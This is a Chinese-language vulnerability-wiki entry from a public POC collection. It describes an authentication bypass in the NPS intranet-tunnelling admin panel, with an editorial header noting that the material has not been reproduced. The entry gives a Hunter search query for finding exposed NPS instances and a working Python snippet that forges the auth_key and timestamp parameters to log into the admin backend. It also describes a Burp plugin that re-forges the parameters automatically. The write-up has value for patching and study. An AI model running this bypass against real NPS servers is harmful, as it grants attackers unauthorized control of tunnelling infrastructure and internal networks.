---
source: "wy876 漏洞文库"
title: "nps auth_key未授权访问漏洞"
product: "NPS内网穿透管理端"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "空配置密钥、20秒时间窗口，持续请求需更新认证参数"
hunter: "app.name==\"NPS\""
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-3a83d3344f2b2d39bffdd31c"
entity_id: "ve-3a83d3344f2b2d39bffdd31c"
schema_version: "1"
---

# nps auth_key未授权访问漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：空配置密钥、20秒时间窗口，持续请求需更新认证参数
- 证据范围：与421同漏洞，补充逐请求注入说明有用，但插件没有名称/下载来源和实现。

### 本次正文校订

- 按该篇代码内容修正错误的 Java 语言标记。
- 将误放入 FOFA 的 Hunter 查询按正文原式保存到 hunter 字段，不改写查询语义。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- fofa字段app.name==截断且正文为Hunter语法，索引平台错误
- Python代码块误标java
- 版本只有产品名、页面/结果截图引用全缺失
- 所有后台功能全都可用未经逐权限验证，当前只有断言
- 缺修复/来源原始commit

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。其中auth_key 存在未授权访问漏洞，当 nps.conf 中的 auth_key 未配置时攻击者通过生成特定的请求包可以获取服务器后台权限。

# 二、影响版本
+ nps

# 三、资产测绘
hunter：`app.name=="NPS"`


登陆页面：


# 四、漏洞复现
nps认证方式是通过配置文件nps.conf中的auth_key与timestamp的md5形式进行认证，但在默认的配置文件中，auth_key 默认被注释，所以只需要可以获取到的参数 timestamp 就可以绕过认证登录。

```python
import time
import hashlib
now = time.time()
m = hashlib.md5()
m.update(str(int(now)).encode("utf8"))
auth_key = m.hexdigest()
 
print("Index/Index?auth_key=%s&timestamp=%s" % (auth_key,int(now)))
```


成功绕过进入后台


NPS存在一个身份验证的缺陷，无需登录，直接进后台，后台功能点全都可以用。具体利用是伪造两个参数auth_key、timestamp。由于参数的生命周期只有20秒，20秒过后就需要重新伪造，故采用burp插件。

插件所有的功能集成到了Burp的右键中：

1、首先访问nps站点，拦截请求包，启用插件 


2、点击“查看仪表盘”会修改请求包，之后直接放行数据包成功登陆后台，后续每一个请求都会自动贴上身份验证参数。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pxqopzr7q1gwysu2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
